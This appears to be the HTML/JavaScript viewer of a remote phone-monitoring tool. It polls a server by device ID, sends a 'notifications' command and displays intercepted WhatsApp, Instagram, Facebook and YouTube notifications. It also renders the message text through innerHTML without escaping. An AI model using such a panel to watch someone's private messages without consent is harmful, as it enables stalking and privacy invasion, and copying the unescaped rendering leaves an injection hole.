<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: #050505;
            --card-bg: #1a1a1a;
            --text-main: #ffffff;
            --text-sub: #b3b3b3;
            --accent: #007AFF; /* iOS Blue */
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
            height: 100vh; overflow: hidden;
        }

        .main-container {
            width: 100%; max-width: 480px;
            background: #000;
            display: flex; flex-direction: column;
            height: 100%;
            position: relative;
        }

        /* --- Header (Clean) --- */
        .header {
            padding: 20px;
            text-align: center;
            background: rgba(20, 20, 20, 0.95);
            border-bottom: 1px solid #333;
            flex-shrink: 0;
            z-index: 10;
        }

        .header h2 {
            margin: 0;
            font-size: 18px;
            font-weight: 600;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            color: #fff;
        }

        /* --- List Area with Scrollbar --- */
        .notif-list {
            flex-grow: 1;
            overflow-y: auto;
            padding: 10px;
            display: flex; flex-direction: column; gap: 10px;
        }

        /* Scrollbar Styling */
        .notif-list::-webkit-scrollbar {
            width: 6px;
        }
        .notif-list::-webkit-scrollbar-track {
            background: #111;
        }
        .notif-list::-webkit-scrollbar-thumb {
            background: #444; 
            border-radius: 3px;
        }
        .notif-list::-webkit-scrollbar-thumb:hover {
            background: #666; 
        }

        /* --- Notification Card --- */
        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 15px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
            border-left: 4px solid #333; /* Default border */
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

        /* Icons & Colors */
        .icon-box {
            width: 40px; height: 40px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem;
            flex-shrink: 0;
            background: #222;
        }

        /* App Specific Styles */
        .whatsapp-style { border-left-color: #25D366; }
        .whatsapp-style .icon-box { background: rgba(37, 211, 102, 0.15); color: #25D366; }

        .instagram-style { border-left-color: #E1306C; }
        .instagram-style .icon-box { background: rgba(225, 48, 108, 0.15); color: #E1306C; }

        .facebook-style { border-left-color: #1877F2; }
        .facebook-style .icon-box { background: rgba(24, 119, 242, 0.15); color: #1877F2; }

        .youtube-style { border-left-color: #FF0000; }
        .youtube-style .icon-box { background: rgba(255, 0, 0, 0.15); color: #FF0000; }

        .system-style { border-left-color: #fff; }
        .system-style .icon-box { background: rgba(255, 255, 255, 0.1); color: #fff; }

        /* Text Content */
        .content { flex: 1; min-width: 0; }
        
        .top-row {
            display: flex; justify-content: space-between;
            margin-bottom: 4px;
        }
        .app-name { font-size: 11px; font-weight: bold; color: var(--text-sub); text-transform: uppercase; }
        .time { font-size: 11px; color: #666; }

        .title { display: block; font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 2px; }
        .message { font-size: 13px; color: #bbb; line-height: 1.4; word-wrap: break-word; }

        /* Small Loading Indicator at bottom */
        #status-footer {
            font-size: 10px; color: #444; text-align: center; padding: 5px;
        }

    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <h2>Notifications</h2>
        </div>

        <div class="notif-list" id="notifContainer">
            <div style="text-align: center; margin-top: 100px; color: #444;">
                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 20px;"></i>
                <p>Waiting for connection...</p>
            </div>
        </div>

        <div id="status-footer">Connecting...</div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const params = new URLSearchParams(window.location.search);
        
        // ID ko fix kiya (uppercase + trim)
        const DEVICE_ID = params.get('id') ? params.get('id').toUpperCase().trim() : null;
        
        let allNotifs = [];

        // --- 1. STARTUP ---
        window.onload = () => {
            if(!DEVICE_ID) {
                document.getElementById('notifContainer').innerHTML = "<p style='text-align:center; color:red; margin-top:50px;'>Device ID Missing</p>";
                return;
            }

            // Load Cache
            const cached = localStorage.getItem(`cache_notif_${DEVICE_ID}`);
            if(cached) {
                try {
                    allNotifs = JSON.parse(cached);
                    renderNotifs();
                } catch(e) {}
            }

            // Start Sync Loop
            syncLoop();
            setInterval(syncLoop, 4000); // 4 seconds refresh
        };

        // --- 2. DATA FETCH ---
        async function syncLoop() {
            const footer = document.getElementById('status-footer');
            try {
                // Command bhejo
                fetch(`${SERVER_URL}/api/send-command`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
                }).catch(()=>{});

                // Data mango
                const res = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`);
                if(!res.ok) throw new Error("Server Error");
                
                const data = await res.json();

                if (Array.isArray(data)) {
                    // Sorting: Newest First (Descending)
                    data.sort((a, b) => b.postTime - a.postTime);

                    if (JSON.stringify(data) !== JSON.stringify(allNotifs)) {
                        allNotifs = data;
                        localStorage.setItem(`cache_notif_${DEVICE_ID}`, JSON.stringify(data));
                        renderNotifs();
                        footer.innerText = "Live | Updated just now";
                        footer.style.color = "#007AFF";
                    } else {
                        footer.innerText = "Live | Waiting for new data";
                        footer.style.color = "#444";
                    }
                }
            } catch (e) {
                console.log(e);
                footer.innerText = "Reconnecting...";
                footer.style.color = "orange";
            }
        }

        // --- 3. RENDER UI ---
        function renderNotifs() {
            const container = document.getElementById('notifContainer');
            
            if(!allNotifs || allNotifs.length === 0) {
                container.innerHTML = `<div style="text-align:center; padding-top:100px; color:#555;">No notifications yet</div>`;
                return;
            }

            container.innerHTML = "";

            allNotifs.forEach(item => {
                const appName = (item.appName || "System").toLowerCase();
                const title = item.title || "Notification";
                const text = item.text || "";
                const time = item.postTime ? formatTime(item.postTime) : "";

                // Design Logic based on App Name
                let styleClass = "system-style";
                let iconHtml = '<i class="fa-solid fa-bell"></i>';

                if(appName.includes("whatsapp")) {
                    styleClass = "whatsapp-style";
                    iconHtml = '<i class="fa-brands fa-whatsapp"></i>';
                } else if(appName.includes("instagram")) {
                    styleClass = "instagram-style";
                    iconHtml = '<i class="fa-brands fa-instagram"></i>';
                } else if(appName.includes("facebook")) {
                    styleClass = "facebook-style";
                    iconHtml = '<i class="fa-brands fa-facebook-f"></i>';
                } else if(appName.includes("youtube")) {
                    styleClass = "youtube-style";
                    iconHtml = '<i class="fa-brands fa-youtube"></i>';
                }

                // Create Card HTML
                const card = `
                    <div class="card ${styleClass}">
                        <div class="icon-box">${iconHtml}</div>
                        <div class="content">
                            <div class="top-row">
                                <span class="app-name">${item.appName || 'System'}</span>
                                <span class="time">${time}</span>
                            </div>
                            <span class="title">${title}</span>
                            <div class="message">${text}</div>
                        </div>
                    </div>
                `;
                container.innerHTML += card;
            });
        }

        function formatTime(ms) {
            try {
                let d = new Date(parseInt(ms));
                return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            } catch(e) { return ""; }
        }
    </script>
</body>
</html>
